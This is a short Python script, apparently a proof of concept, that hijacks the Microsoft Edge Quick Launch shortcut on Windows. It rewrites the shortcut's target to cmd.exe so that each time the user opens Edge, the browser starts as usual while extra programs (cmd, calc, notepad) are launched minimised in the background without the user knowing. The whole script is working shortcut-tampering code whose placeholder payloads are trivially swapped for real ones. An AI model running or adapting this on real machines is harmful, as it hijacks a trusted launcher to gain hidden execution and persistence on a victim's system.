import os
import sys

if sys.platform == "win32":
    import win32com.client
else:
    win32com = None


def modify_edge_shortcuts():
    current_user = os.getlogin()
    #print(current_user)
    # New path to the Microsoft Edge shortcut
    edge_shortcut_path = r"C:\Users\{}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk".format(current_user)


    # Modify the specified Edge shortcut
    modify_shortcut(edge_shortcut_path)

def modify_shortcut(shortcut_path):
    try:
        # Use win32com.client to modify the shortcut properties
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)

        target = r"%windir%\system32\cmd.exe"
        arguments = rf'/c start "" "{shortcut.TargetPath}" & start /MIN cmd.exe & start /MIN calc.exe & start /MIN notepad.exe'

        shortcut.TargetPath = target
        shortcut.Arguments = arguments

        shortcut.Save()
        print(f"Shortcut modified: {shortcut_path}")

    except Exception as e:
        print(f"Error modifying shortcut '{shortcut_path}': {e}")

def main():
    modify_edge_shortcuts()

if __name__ == "__main__":
    main()
